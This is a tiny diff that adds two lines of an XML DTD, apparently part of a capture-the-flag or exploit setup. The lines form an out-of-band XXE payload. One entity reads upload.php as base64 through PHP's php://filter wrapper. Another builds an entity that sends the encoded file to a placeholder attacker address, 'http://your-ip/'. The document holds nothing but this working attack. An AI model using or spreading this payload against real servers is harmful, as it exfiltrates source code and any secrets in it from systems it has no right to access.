@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=upload.php">
+<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://your-ip/?%file;'>">
